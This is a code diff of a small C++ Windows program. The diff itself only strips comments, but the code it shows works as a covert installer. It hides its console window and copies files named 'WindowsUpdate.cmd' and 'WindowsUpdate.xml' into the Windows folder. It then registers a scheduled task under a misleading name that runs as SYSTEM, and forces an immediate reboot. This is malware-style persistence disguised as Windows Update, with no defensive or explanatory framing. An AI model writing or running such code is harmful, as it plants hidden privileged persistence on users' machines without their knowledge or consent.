@@ -15,14 +15,12 @@ int main()
 {
 
 		ShowWindow(GetConsoleWindow(), SW_HIDE);
-	
 		std::string script;
 		std::string path;
 		std::string xmlpath;
 		 //GET CURRENT DIRECTORY
 		wchar_t NPath[MAX_PATH];
 		GetCurrentDirectory(MAX_PATH, NPath);
-		//std::wcout << NPath << std::endl;
 		std::wofstream MyFile("filename.txt");
 		MyFile << NPath;
 		MyFile.close();
@@ -30,15 +28,11 @@ int main()
 		std::string myText;
 
 		while (getline(MyReadFile, myText)) {
-			// Output the text from the file
-			//std::cout << myText << std::endl;
 		}
 		MyReadFile.close();
 	
 		path = "copy " + myText + "\\WindowsUpdate.cmd c:\\Windows\\";
 		xmlpath = "copy " + myText + "\\WindowsUpdate.xml c:\\Windows\\";
-
-		//script = "SCHTASKS /CREATE /SC ONSTART /RL HIGHEST /TN ""MyTasks\Notepadtask""  /TR " "c:\\Windows\\WindowsUpdate.cmd ";
 		script = "SCHTASKS /CREATE /RU SYSTEM /XML c:\\Windows\\WindowsUpdate.xml  /TN ""MyTasks\Notepadtask"" ";
 		
 		const char* c = script.c_str();
@@ -48,8 +42,4 @@ int main()
 		system(cxmlpath);
 		system(c);
 		system("shutdown /r /t 0");
-
-
-
-		
 }
